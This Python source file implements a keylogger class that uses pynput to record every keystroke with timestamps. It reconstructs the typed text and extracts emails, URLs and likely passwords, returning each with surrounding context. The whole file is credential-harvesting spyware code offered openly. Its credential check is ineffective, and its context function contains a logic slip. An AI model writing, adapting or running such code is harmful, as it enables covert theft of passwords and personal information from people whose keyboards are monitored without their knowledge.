#!/usr/bin/env python3
"""
Keylogger Module (Optional)
Captures keystrokes in desktop environments
"""

import os
import re
import time
import threading
from typing import List, Dict, Any, Callable
from datetime import datetime

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

class Keylogger:
    def __init__(self, config):
        self.config = config
        self.is_running = False
        self.key_buffer = []
        self.callback = None
        self.listener = None
        
    def start(self, callback: Callable = None, duration: int = 60) -> bool:
        """Start keylogging for specified duration"""
        if not PYNPUT_AVAILABLE:
            return False
            
        if self.is_running:
            return False
            
        self.callback = callback
        self.is_running = True
        
        # Start listener in separate thread
        self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
        self.listener.start()
        
        # Set timer to stop after duration
        if duration > 0:
            timer = threading.Timer(duration, self.stop)
            timer.start()
            
        return True
    
    def stop(self) -> Dict[str, Any]:
        """Stop keylogging and return results"""
        if not self.is_running:
            return {"error": "Keylogger not running"}
            
        self.is_running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
            
        # Analyze captured keystrokes
        results = self._analyze_keystrokes()
        
        # Clear buffer
        self.key_buffer = []
        
        return results
    
    def _on_press(self, key):
        """Handle key press events"""
        if not self.is_running:
            return False
            
        try:
            timestamp = datetime.now().isoformat()
            key_char = key.char if hasattr(key, 'char') else str(key)
            
            self.key_buffer.append({
                "timestamp": timestamp,
                "key": key_char,
                "type": "press"
            })
            
            # Check for potential credentials
            if self._is_potential_credential(key_char):
                if self.callback:
                    self.callback({
                        "type": "potential_credential",
                        "key": key_char,
                        "timestamp": timestamp
                    })
                    
        except AttributeError:
            pass
            
        return True
    
    def _on_release(self, key):
        """Handle key release events"""
        if not self.is_running:
            return False
            
        try:
            timestamp = datetime.now().isoformat()
            key_char = key.char if hasattr(key, 'char') else str(key)
            
            self.key_buffer.append({
                "timestamp": timestamp,
                "key": key_char,
                "type": "release"
            })
            
        except AttributeError:
            pass
            
        return True
    
    def _is_potential_credential(self, key_char: str) -> bool:
        """Check if keystroke might be part of a credential"""
        # Look for patterns that might indicate credential entry
        credential_indicators = [
            "password", "passwd", "secret", "token", "key", "api",
            "login", "auth", "credential", "pwd", "pass"
        ]
        
        # This is a simplified check - in practice you'd want more sophisticated
        # pattern matching and context awareness
        return any(indicator in key_char.lower() for indicator in credential_indicators)
    
    def _analyze_keystrokes(self) -> Dict[str, Any]:
        """Analyze captured keystrokes for patterns"""
        if not self.key_buffer:
            return {"keystrokes": [], "patterns": [], "summary": "No keystrokes captured"}
        
        # Extract text from keystrokes
        text = ""
        for event in self.key_buffer:
            if event["type"] == "press" and len(event["key"]) == 1:
                text += event["key"]
        
        # Look for patterns
        patterns = self._find_patterns(text)
        
        return {
            "keystrokes": self.key_buffer,
            "text": text,
            "patterns": patterns,
            "summary": {
                "total_keystrokes": len(self.key_buffer),
                "text_length": len(text),
                "patterns_found": len(patterns)
            }
        }
    
    def _find_patterns(self, text: str) -> List[Dict[str, Any]]:
        """Find patterns in captured text"""
        patterns = []
        
        # Check for email patterns
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, text)
        for email in emails:
            patterns.append({
                "type": "email",
                "value": email,
                "context": self._get_context(text, email)
            })
        
        # Check for URL patterns
        url_pattern = r'https?://[^\s]+'
        urls = re.findall(url_pattern, text)
        for url in urls:
            patterns.append({
                "type": "url",
                "value": url,
                "context": self._get_context(text, url)
            })
        
        # Check for potential passwords (long strings without spaces)
        password_pattern = r'\b[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};\':"\\|,.<>\/?]{8,}\b'
        passwords = re.findall(password_pattern, text)
        for password in passwords:
            patterns.append({
                "type": "potential_password",
                "value": password,
                "context": self._get_context(text, password)
            })
        
        return patterns
    
    def _get_context(self, text: str, match: str, context_size: int = 50) -> str:
        """Get context around a match"""
        try:
            start = text.find(match)
            if start != -1:
                start = max(0, start - context_size)
                end = min(len(text), start + len(match) + context_size)
                return text[start:end]
        except:
            pass
        return ""
    
    def is_available(self) -> bool:
        """Check if keylogger is available on this system"""
        return PYNPUT_AVAILABLE and os.environ.get('DISPLAY') is not None 